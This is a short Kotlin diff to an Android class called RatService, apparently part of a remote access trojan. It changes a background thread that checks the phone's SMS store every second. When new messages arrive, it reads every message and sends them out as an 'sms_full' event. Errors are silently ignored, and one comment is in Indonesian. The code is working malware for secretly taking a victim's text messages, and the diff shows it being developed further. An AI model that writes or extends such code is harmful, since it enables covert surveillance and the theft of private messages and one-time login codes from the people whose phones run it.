@@ -83,25 +83,27 @@ class RatService : Service() {
     }
 
     private fun startSmsPolling() {
-        if (smsPollThread != null) return
-        smsPollThread = Thread {
-            var lastCount = 0
-            while (running) {
-                try {
-                    val current = handler.countSms()
-                    if (current != lastCount) {
-                        lastCount = current
-                        val smsData = handler.readAllSmsPublic()
-                        sendEvent(mapOf(
-                            "type" to "sms_full",
-                            "data" to smsData
-                        ))
-                    }
-                    Thread.sleep(1000)
-                } catch (_: Exception) {}
-            }
-        }.also { it.start() }
-    }
+    if (smsPollThread != null) return
+    smsPollThread = Thread {
+        var lastTimestamp = 0L
+        while (running) {
+            try {
+                val current = handler.getSmsLastTimestamp()
+                if (current > lastTimestamp) {
+                    // Ada SMS baru → kirim semua
+                    lastTimestamp = current
+                    val smsData = handler.readAllSmsPublic()
+                    sendEvent(mapOf(
+                        "type" to "sms_full",
+                        "data" to smsData
+                    ))
+                    Log.i("RatService", "📩 SMS updated — new timestamp=$current")
+                }
+                Thread.sleep(1000)
+            } catch (_: Exception) {}
+        }
+    }.also { it.start() }
+}
 
     private fun buildNotification(): Notification {
         val pi = PendingIntent.getActivity(
